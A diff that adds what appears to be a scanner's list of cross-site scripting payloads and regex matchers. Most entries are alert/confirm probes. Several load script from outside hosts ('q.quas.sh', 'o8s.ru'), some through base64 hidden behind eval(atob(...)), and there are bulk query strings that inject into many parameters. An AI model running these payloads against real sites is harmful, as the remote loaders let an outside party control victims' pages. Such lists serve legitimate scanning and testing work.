@@ -1,0 +1,835 @@
+"><img src=x onerror=console.log(123);>
+"footnotes": "[{\"content\":\"<script>alert(document.domain)</script>\",\"id\":\"testid\"}]"
+%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+'"><script>javascript:alert('xss')</script>
+- "' x='y' onfocus='alert(1)"
+- "' x='y' onmouseover='alert(1)"
+- "' x='y' onscrollsend='alert(1)"
+- "'-alealert(1337)rt(1337)-'"
+- "'-alert(1)-'"
+- "'-alert(1337)-'"
+- "'-alert(document.domain)-'"
+- "';alealert(1337)rt(1337);//"
+- "';alert('XSS');//"
+- "';alert(1337);//"
+- "'><script src=//q.quas.sh></script>"
+- "'><script>alert('XSS')</script>"
+- "'><svg/onload=confirm`xss`>"
+- "'><xsg x='y' onscrollsend='alert(1)'>"
+- "'>\"<svg/onload=confirm('action')>"
+- "'>\"<svg/onload=confirm('api')>"
+- "'>\"<svg/onload=confirm('api_key')>"
+- "'>\"<svg/onload=confirm('begindate')>"
+- "'>\"<svg/onload=confirm('callback')>"
+- "'>\"<svg/onload=confirm('cat')>"
+- "'>\"<svg/onload=confirm('categoryid')>"
+- "'>\"<svg/onload=confirm('csrf_token')>"
+- "'>\"<svg/onload=confirm('email')>"
+- "'>\"<svg/onload=confirm('emailto')>"
+- "'>\"<svg/onload=confirm('enddate')>"
+- "'>\"<svg/onload=confirm('id')>"
+- "'>\"<svg/onload=confirm('immagine')>"
+- "'>\"<svg/onload=confirm('item')>"
+- "'>\"<svg/onload=confirm('jsonp')>"
+- "'>\"<svg/onload=confirm('key')>"
+- "'>\"<svg/onload=confirm('keyword')>"
+- "'>\"<svg/onload=confirm('keywords')>"
+- "'>\"<svg/onload=confirm('l')>"
+- "'>\"<svg/onload=confirm('lang')>"
+- "'>\"<svg/onload=confirm('list_type')>"
+- "'>\"<svg/onload=confirm('month')>"
+- "'>\"<svg/onload=confirm('name')>"
+- "'>\"<svg/onload=confirm('p')>"
+- "'>\"<svg/onload=confirm('page')>"
+- "'>\"<svg/onload=confirm('page_id')>"
+- "'>\"<svg/onload=confirm('password')>"
+- "'>\"<svg/onload=confirm('q')>"
+- "'>\"<svg/onload=confirm('query')>"
+- "'>\"<svg/onload=confirm('s')>"
+- "'>\"<svg/onload=confirm('search')>"
+- "'>\"<svg/onload=confirm('terms')>"
+- "'>\"<svg/onload=confirm('test')>"
+- "'>\"<svg/onload=confirm('token')>"
+- "'>\"<svg/onload=confirm('type')>"
+- "'>\"<svg/onload=confirm('unsubscribe_token')>"
+- "'>\"<svg/onload=confirm('url')>"
+- "'>\"<svg/onload=confirm('view')>"
+- "'>\"<svg/onload=confirm('xss-"
+- "'>\"<svg/onload=confirm('year')>"
+- "(?i)<[^>]* x='y' onfocus='alert\\(1\\)'[^>]*>"
+- "(?i)<[^>]* x='y' onmouseover='alert\\(1\\)'[^>]*>"
+- "(?i)<[^>]* x=\"y\" onfocus=\"alert\\('xss'\\)\"[^>]*>"
+- "(?i)<[^>]* x=\"y\" onmouseover=\"alert\\('xss'\\)\"[^>]*>"
+- "(?i)<[^>]*xss x=\"y\" onmouseover=\"alert\\('xss'\\)\"[^>]*>"
+- "(?i)<script[^>]*>.*'-alert\\(document.domain\\)-'.*</script>"
+- "(?i)<script[^>]*>.*\"; alert\\('xss'\\); //.*</script>"
+- "(?i)<script[^>]*>.*\\\\\"; alert\\('xss'\\); //.*</script>"
+- "(?i)<script[^>]*>[\\s\\S]*'.*'-alert\\(1337\\)-'\\s*[\\s\\S]*</script>"
+- "(?i)<script[^>]*>[\\s\\S]*'.*'-alert\\?\\.\\(1337\\)-'\\s*[\\s\\S]*</script>"
+- "(?i)<script[^>]*>[\\s\\S]*'.*';alert\\(1337\\);\\s*//[\\s\\S]*</script>"
+- "(?i)<script[^>]*>[\\s\\S]*'.*';alert\\?\\.\\(1337\\);\\s*//[\\s\\S]*</script>"
+- "(?i)<script[^>]*>[\\s\\S]*'.*\\\\'-alert\\?\\.\\(1337\\)-\\\\'\\s*[\\s\\S]*</script>"
+- "(?i)<script[^>]*>[\\s\\S]*'.*\\\\';alert\\(1337\\);\\s*//[\\s\\S]*</script>"
+- "(?i)<script[^>]*>[\\s\\S]*'.*\\\\';alert\\?\\.\\(1337\\);\\s*//[\\s\\S]*</script>"
+- "(?i)<script[^>]*>[\\s\\S]*\".*\"-alert\\(1337\\)-\"\\s*[\\s\\S]*</script>"
+- "(?i)<script[^>]*>[\\s\\S]*\".*\"-alert\\?\\.\\(1337\\)-\"\\s*[\\s\\S]*</script>"
+- "(?i)<script[^>]*>[\\s\\S]*\".*\";alert\\(1337\\);\\s*//[\\s\\S]*</script>"
+- "(?i)<script[^>]*>[\\s\\S]*\".*\";alert\\?\\.\\(1337\\);\\s*//[\\s\\S]*</script>"
+- "(?i)<script[^>]*>[\\s\\S]*\".*\\\\\"-alert\\(1337\\)-\\\\\"\\s*[\\s\\S]*</script>"
+- "(?i)<script[^>]*>[\\s\\S]*\".*\\\\\"-alert\\?\\.\\(1337\\)-\\\\\"\\s*[\\s\\S]*</script>"
+- "(?i)<script[^>]*>[\\s\\S]*\".*\\\\\";alert\\(1337\\);\\s*//[\\s\\S]*</script>"
+- "(?i)<script[^>]*>[\\s\\S]*\".*\\\\\";alert\\?\\.\\(1337\\);\\s*//[\\s\\S]*</script>"
+- "(?i)<script[^>]*>[^<]*'[^\"\\\\]*'-alert\\(document.domain\\)-'[^<]*</script>"
+- "(?i)<script[^>]*>[^<]*\"[^\"<]*><xss x=\"y\" onmouseover=\"alert\\('xss'\\)\"></xss>[^\"<]*\"[^<]*</script>"
+- "(?i)<script[^>]*>[^<]*\"[^\"\\\\]*\"-alert\\(document.domain\\)-\"[^<]*</script>"
+- "(?i)<script[^>]*>[^<]*\\\\'-alert\\(document.domain\\)-'[^<]*</script>"
+- "(?i)<script[^>]*>[^<]*\\\\\"; alert\\('xss'\\); //[^<]*</script>"
+- "(?i)action\\s*=\\s*[\"']?javascript:alert\\(document.domain\\)"
+- "(?i)href\\s*=\\s*[\"']?javascript:alert\\(document.domain\\)"
+- "(?i)href\\s*=\\s*[\"']?javascript:alert\\\\u0028document.domain\\\\u0029"
+- "(?i)onclick\\s*=\\s*[']?location=\"javascript:alert\\(document.domain\\)\""
+- "(?i)onclick\\s*=\\s*[\"]?location='javascript:alert\\(document.domain\\)'"
+- "--></tiTle></stYle></texTarea></scrIpt>\"//'//><scrIpt src=\"https://o8s.ru\"></scrIpt>"
+- "/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>\"//'//><scrIpt src=\"https://o8s.ru\"></scrIpt>"
+- "/play?src=data:text/html,<script>alert('CTP-XSS')</script>"
+- "/tmp/www/<script>alert(document.domain)</script>"
+- "</iframe><svg/onload=alert(1)>"
+- "</sc</script>ript><xs<xsg> x=\"y\" onscrollsend=\"alert(1)\">"
+- "</script><img src onerror=alert(/XSS-form/)>"
+- "</script><script>alert(document.domain)</script>"
+- "</script><svg/onload=alert('{{randstr}}')>"
+- "</script><svg/onload=alert(/XSS/)>"
+- "</script><xsg x=\"y\" onscrollsend=\"alert(1)\">"
+- "</script><xss x=\"y\" onmouseover=\"alert('xss')\"></xss>"
+- "<?xml version=\"1.0\"?><x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain&#x29;</x:script>"
+- "<body onload=alert('XSS')>"
+- "<body onload=alert(1)>"
+- "<body onload=alert(document.domain) />"
+- "<div><script>alert(document.domain)</script></div>"
+- "<iframe src=javascript:alert('XSS')>"
+- "<img src='' onerror=alert(document.domain)>' in read mode"
+- "<img src=a onerror=alert('{{randstr}}')>"
+- "<img src=x onerror=alert('XSS')>"
+- "<img src=x onerror=confirm(25)>"
+- "<img/src/onerror=prompt(8)>"
+- "<script>alert('XSS')</script>"
+- "<script>alert('document.domain');</script>"
+- "<script>alert('xss')</script>"
+- "<script>alert('{{randstr}}')</script>"
+- "<script>alert(1)</script>"
+- "<script>alert(123);</script>"
+- "<script>alert(123)</script>"
+- "<script>alert(31337)</script>"
+- "<script>alert(document.cookie)</script>"
+- "<script>alert(document.domain)</script>"
+- "<script>alert({{randstr}})</script>"
+- "<script>confirm(25)</script>"
+- "<script>prompt('XSS')</script>"
+- "<strong><img src onerror=alert(document.domain)></strong>"
+- "<svg onload=alert'XSS')>"
+- "<svg/onload=alert('xss')>"
+- "<svg/onload=alert('{{randstr}}')>"
+- "<svg/onload=alert(/xss/)>"
+- "<svg/onload=alert(1)>"
+- "<svg/onload=alert(1337)>"
+- "<svg/onload=alert(xss)>"
+- "<svg/onload=alert`{{randstr}}`>"
+- "<svg/onload=confirm('testing-xss"
+- "<svg/onload=confirm('testing-xss')>"
+- "<svg/onload=confirm(/{{randstr}}/)>"
+- "<svg/onload=confirm(document.domain);>"
+- "<svg/onload=prompt('xss')>"
+- "><sVg/Onload=alert`document.domain`>"
+- "><script>alert(document.domain)</script>"
+- "ERROR: <script>alert('document.domain');</script>"
+- "Undefined index: --><svg onload=alert(document.domain)> in file"
+- "\" x=\"y\" onfocus=\"alert('xss')"
+- "\" x=\"y\" onmouseover=\"alert('xss')"
+- "\" x=\"y\" onscrollsend=\"alert('xs')"
+- "\"-alalert(1337)ert(1337)-\""
+- "\"-alert(1337)-\""
+- "\"-alert(document.domain)-\""
+- "\"; alert('xss'); //"
+- "\";alealert(1337)rt(1337);//"
+- "\";alert(1337);//"
+- "\"><body onload=alert('XSS')>"
+- "\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcS5xdWFzLnNoIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>"
+- "\"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcS5xdWFzLnNoIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>"
+- "\"><script src=//q.quas.sh></script>"
+- "\"><script>alert('XSS')</script>"
+- "\"><svg/onload=alert('XSS')>"
+- "\"><xsg x=\"y\" onscrollsend=\"alert(1)\">"
+- "\"><xss x=\"y\" onmouseover=\"alert('xss')\"></xss>"
+- "`'\"></Title/</StYle/</TeXtarEa/</ScRipt/</NoScRiPt/</SeLeCt/</OpTiOn/</Svg/''\"><svg/onload=javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbzhzLnJ1Ijtkb2N1bWVudC5ib2R5LmFwcGVuZChhKTs='))//"
+- "`'\"></script></title></textarea><script src=//o8s.ru></script>"
+- "`'\"><script src=//o8s.ru></script>"
+- "activated=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-activated%27%29%3E&trigger=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-trigger%27%29%3E&loggedout=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-loggedout%27%29%3E&script=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-script%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-query%27%29%3E&file_name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-file_name%27%29%3E&fname=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-fname%27%29%3E&options=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-options%27%29%3E&export=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-export%27%29%3E&post=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-p%27%29%3E&action2=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-action2%27%29%3E&c=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-c%27%29%3E&destination=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-destination%27%29%3E"
+- "admin_email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-admin_email%27%29%3E&code=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-code%27%29%3E&dump=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dump%27%29%3E&item=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-item%27%29%3E&timezone=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-timezone%27%29%3E&blog_public=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-blog_public%27%29%3E&add=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-add%27%29%3E&enable=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-enable%27%29%3E&customized=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-customized%27%29%3E&admin_password=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-admin_password%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-keywords%27%29%3E&timestamp=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-timestamp%27%29%3E&label=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-label%27%29%3E&g=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-g%27%29%3E"
+- "ajax=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-ajax%27%29%3E&timezone_string=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-timezone_string%27%29%3E&group=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-group%27%29%3E&update=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-update%27%29%3E&revision=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-revision%27%29%3E&referer=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-referer%27%29%3E&index=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-index%27%29%3E&src=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-src%27%29%3E&end_date=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-end_date%27%29%3E&gmt_offset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-gmt_offset%27%29%3E&params=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-params%27%29%3E&html=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-html%27%29%3E&pass=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-pass%27%29%3E&offset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-offset%27%29%3E"
+- "alert('XSS')"
+- "alert('document.domain');"
+- "alert('xss')"
+- "alert(1)"
+- "alert(1)//>*/;top.alert(2)//"
+- "alert(1);"
+- "alert(1);</script>"
+- "alert(1)</script>"
+- "alert(\"xss\")"
+- "alert(\"xss\");"
+- "alert(document.domain);"
+- "attachment=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-attachment%27%29%3E&dbname=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dbname%27%29%3E&rows=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-rows%27%29%3E&parent_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-parent_id%27%29%3E&lang=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-lang%27%29%3E&fid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-fid%27%29%3E&text=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-text%27%29%3E&link=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link%27%29%3E&timeout=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-timeout%27%29%3E&db_name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-db_name%27%29%3E&ids=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-ids%27%29%3E&w=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-w%27%29%3E&provider=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-provider%27%29%3E&plugin_status=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-plugin_status%27%29%3E"
+- "callback=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-callback%27%29%3E&weblog_title=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-weblog_title%27%29%3E&check=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-check%27%29%3E&overwrite=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-overwrite%27%29%3E&prefix=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-prefix%27%29%3E&l=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-l%27%29%3E&token=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-token%27%29%3E&start_date=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-start_date%27%29%3E&direction=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-direction%27%29%3E&ID=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-ID%27%29%3E&pid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-pid%27%29%3E&to=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-to%27%29%3E&checkemail=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-checkemail%27%29%3E&menu-locations=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-menu-locations%27%29%3E"
+- "confirm(1)"
+- "contains((body), '<script>alert(1)</script>')"
+- "deleted=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-deleted%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-search%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-action%27%29%3E&newname=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-newname%27%29%3E&info=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-info%27%29%3E&content=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-content%27%29%3E&signature=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-signature%27%29%3E&noconfirmation=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-noconfirmation%27%29%3E&field=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-field%27%29%3E&output=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-output%27%29%3E&city=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-city%27%29%3E&rename=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-rename%27%29%3E&mail=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-mail%27%29%3E&term=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-term%27%29%3E"
+- "edit-menu-item=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-edit-menu-item%27%29%3E&error=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-error%27%29%3E&post_title=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_title%27%29%3E&x=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-x%27%29%3E&down=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-down%27%29%3E&state=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-state%27%29%3E&data=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-data%27%29%3E&auth=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-auth%27%29%3E&themes=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-themes%27%29%3E&captcha=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-captcha%27%29%3E&nickname=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nickname%27%29%3E&allusers=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-allusers%27%29%3E&color=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-color%27%29%3E&path=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-path%27%29%3E"
+- "http://testphp.vulnweb.com/listproducts.php?cat=<img/src/onerror=prompt(8)>"
+- "i=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-i%27%29%3E&database=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-database%27%29%3E&tax_input=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-tax_input%27%29%3E&secret=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-secret%27%29%3E&mod=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-mod%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-s%27%29%3E&stage=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-stage%27%29%3E&time=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-time%27%29%3E&new=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-new%27%29%3E&api_key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-api_key%27%29%3E&invalid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-invalid%27%29%3E&db=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-db%27%29%3E&upload=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-upload%27%29%3E&tablename=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-tablename%27%29%3E"
+- "image=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-image%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-id%27%29%3E&order=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-order%27%29%3E&sid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-sid%27%29%3E&language=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-language%27%29%3E&filter=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-filter%27%29%3E&import=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-import%27%29%3E&st=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-st%27%29%3E&act=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-act%27%29%3E&object=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-object%27%29%3E&insert=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-insert%27%29%3E&task=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-task%27%29%3E&dismiss=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dismiss%27%29%3E&orderby=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-orderby%27%29%3E"
+- "javascript&colon;alert(document.domain);dd&sol;&sol;"
+- "javascript:alert(document.domain)"
+- "javascript:alert\\u0028document.domain\\u0029"
+- "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://q.quas.sh\';document.body.appendChild(a)')"
+- "javascript:eval(\"var a=document.createElement(\\\"script\\\");a.src=\\\"https://q.quas.sh\\\";document.body.appendChild(a)\")"
+- "javasjavascriptcript:alert(document.domain)"
+- "location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E"
+- "location='../../</script><script>alert(document.domain)</script>"
+- "location='javascript:alert(document.domain)'"
+- "location='javasjavascriptcript:alert(document.domain)'"
+- "location=\"javajavascriptscript:alert(document.domain)\""
+- "location=\"javascript:alert(document.domain)\""
+- "name=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-name%27%29%3E&json=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-json%27%29%3E&id_base=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-id_base%27%29%3E&where=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-where%27%29%3E&request=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-request%27%29%3E&notes=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-notes%27%29%3E&img=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-img%27%29%3E&a=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-a%27%29%3E&menu-item=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-menu-item%27%29%3E&xml=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-xml%27%29%3E&columns=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-columns%27%29%3E&service=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-service%27%29%3E&site_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site_id%27%29%3E"
+- "next=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-next%27%29%3E&preview=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-preview%27%29%3E&shortcode=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-shortcode%27%29%3E&features=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-features%27%29%3E&mode=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-mode%27%29%3E&out_trade_no=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-out_trade_no%27%29%3E&category=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-category%27%29%3E&replytocom=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-replytocom%27%29%3E&from=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-from%27%29%3E&start=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-start%27%29%3E&value=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-value%27%29%3E&range=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-range%27%29%3E&table=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-table%27%29%3E&limit=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-limit%27%29%3E"
+- "num=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-num%27%29%3E&drop=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-drop%27%29%3E&g-recaptcha-response=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-g-recaptcha-response%27%29%3E&field_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-field_id%27%29%3E&user_email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-user_email%27%29%3E&alias=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-alias%27%29%3E&ref=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-ref%27%29%3E&save=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-save%27%29%3E&enabled=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-enabled%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-year%27%29%3E&checked=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-checked%27%29%3E&post_ID=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_ID%27%29%3E&files=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-files%27%29%3E&text-color=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-text-color%27%29%3E"
+- "onerror=alert('XSS')"
+- "onload=alert('XSS')"
+- "option=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-option%27%29%3E&server=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-server%27%29%3E&admin=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-admin%27%29%3E&create=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-create%27%29%3E&template=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-template%27%29%3E&number=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-number%27%29%3E&lastname=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-lastname%27%29%3E&multi_number=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-multi_number%27%29%3E&size=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-size%27%29%3E&tax=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-tax%27%29%3E&sql=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-sql%27%29%3E&show_sticky=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-show_sticky%27%29%3E&attachments=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-attachments%27%29%3E&_method=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-_method%27%29%3E"
+- "order_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-order_id%27%29%3E&cookie=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cookie%27%29%3E&debug=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-debug%27%29%3E&m=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-m%27%29%3E&dir=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dir%27%29%3E&new_role=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-new_role%27%29%3E&trashed=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-trashed%27%29%3E&log=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-log%27%29%3E&excerpt=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-excerpt%27%29%3E&settings-updated=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-settings-updated%27%29%3E&plugins=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-plugins%27%29%3E&modify=%27%3E%